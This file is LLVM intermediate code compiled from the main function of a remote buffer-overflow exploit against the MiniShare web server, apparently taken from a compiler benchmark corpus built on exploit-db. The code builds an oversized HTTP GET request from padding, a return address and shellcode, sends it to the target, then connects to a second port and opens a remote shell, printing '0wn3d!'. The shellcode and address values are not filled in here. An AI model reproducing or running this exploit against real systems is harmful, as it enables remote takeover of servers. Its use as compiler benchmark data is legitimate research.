; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_636.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_636.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [16 x i8] c"Usage: TARGET.\0A\00", align 1
@.str.1 = private unnamed_addr constant [68 x i8] c"\0A***MiniShare remote buffer overflow UNIX exploit by NoPh0BiA.***\0A\0A\00", align 1
@RET = common dso_local global i8* null, align 8
@shellcode = common dso_local global i8* null, align 8
@PORT = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [34 x i8] c"[x] Connected to: %s on port %d.\0A\00", align 1
@.str.3 = private unnamed_addr constant [23 x i8] c"[x] Sending bad code..\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"GET \00", align 1
@.str.5 = private unnamed_addr constant [14 x i8] c" HTTP/1.1\0D\0A\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"done.\0A\00", align 1
@.str.7 = private unnamed_addr constant [43 x i8] c"[x] Trying to connect to: %s on port %d..\0A\00", align 1
@PORT1 = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [13 x i8] c"[x] 0wn3d!\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* %4, align 4
  %12 = icmp slt i32 %11, 2
  br i1 %12, label %13, label %16

13:                                               ; preds = %2
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i64 0, i64 0))
  %15 = call i32 @exit(i32 0) #3
  unreachable

16:                                               ; preds = %2
  %17 = call i8* @malloc(i32 2220)
  store i8* %17, i8** %6, align 8
  %18 = call i8* @malloc(i32 30)
  store i8* %18, i8** %7, align 8
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 1
  %21 = load i8*, i8** %20, align 8
  store i8* %21, i8** %8, align 8
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.1, i64 0, i64 0))
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 @memset(i8* %23, i32 0, i32 2220)
  %25 = load i8*, i8** %7, align 8
  %26 = call i32 @memset(i8* %25, i32 66, i32 30)
  %27 = load i8*, i8** %6, align 8
  %28 = call i32 @memset(i8* %27, i32 65, i32 1787)
  %29 = load i8*, i8** %6, align 8
  %30 = load i8*, i8** @RET, align 8
  %31 = call i32 @strcat(i8* %29, i8* %30)
  %32 = load i8*, i8** %6, align 8
  %33 = load i8*, i8** %7, align 8
  %34 = call i32 @strcat(i8* %32, i8* %33)
  %35 = load i8*, i8** %6, align 8
  %36 = load i8*, i8** @shellcode, align 8
  %37 = call i32 @strcat(i8* %35, i8* %36)
  %38 = load i8*, i8** %8, align 8
  %39 = load i32, i32* @PORT, align 4
  %40 = call i32 @conn(i8* %38, i32 %39)
  store i32 %40, i32* %9, align 4
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %46

42:                                               ; preds = %16
  %43 = load i8*, i8** %8, align 8
  %44 = load i32, i32* @PORT, align 4
  %45 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.2, i64 0, i64 0), i8* %43, i32 %44)
  br label %46

46:                                               ; preds = %42, %16
  %47 = call i32 @sleep(i32 3)
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i64 0, i64 0))
  %49 = load i32, i32* %9, align 4
  %50 = call i32 @write(i32 %49, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0), i32 4)
  %51 = load i32, i32* %9, align 4
  %52 = load i8*, i8** %6, align 8
  %53 = call i32 @write(i32 %51, i8* %52, i32 2220)
  %54 = load i32, i32* %9, align 4
  %55 = call i32 @write(i32 %54, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.5, i64 0, i64 0), i32 13)
  %56 = call i32 @sleep(i32 3)
  %57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0))
  %58 = load i8*, i8** %8, align 8
  %59 = load i32, i32* @PORT1, align 4
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.7, i64 0, i64 0), i8* %58, i32 %59)
  %61 = load i8*, i8** %8, align 8
  %62 = load i32, i32* @PORT1, align 4
  %63 = call i32 @conn(i8* %61, i32 %62)
  store i32 %63, i32* %10, align 4
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %65, label %69

65:                                               ; preds = %46
  %66 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.8, i64 0, i64 0))
  %67 = load i32, i32* %10, align 4
  %68 = call i32 @shell(i32 %67)
  br label %69

69:                                               ; preds = %65, %46
  %70 = load i32, i32* %3, align 4
  ret i32 %70
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @conn(i8*, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @shell(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
